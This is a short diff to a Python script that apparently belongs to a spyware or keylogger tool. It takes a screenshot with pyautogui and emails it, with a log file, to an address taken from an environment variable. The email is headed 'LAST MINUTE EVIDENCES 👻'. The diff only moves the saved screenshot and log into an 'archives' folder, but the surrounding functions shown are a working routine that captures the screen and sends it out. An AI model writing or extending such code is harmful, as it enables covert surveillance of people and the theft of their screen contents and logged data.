@@ -10,7 +10,7 @@ class sendEvidences:pass
 
 def save_screenshot():
     myScreenshot = pyautogui.screenshot()
-    myScreenshot.save(r'Public/Evidence.png')  #Save Screenshot
+    myScreenshot.save(r'archives/Evidence.png')  #Save Screenshot
 
 def send_email():
     receiver_emails = [os.getenv("SEND-EMAIL")]  #Email Send
@@ -20,8 +20,8 @@ def send_email():
     # Archives path e Body Message
     contents = [
         '<b> <font color="#FF1493" size="10">  LAST MINUTE EVIDENCES 👻   </font>  </b>',
-        "Log.txt",
-        "Evidence.png"
+        "archives/Logs.txt",
+        "archives/Evidence.png"
     ]
 
     yag.send(receiver_emails, subject, contents)
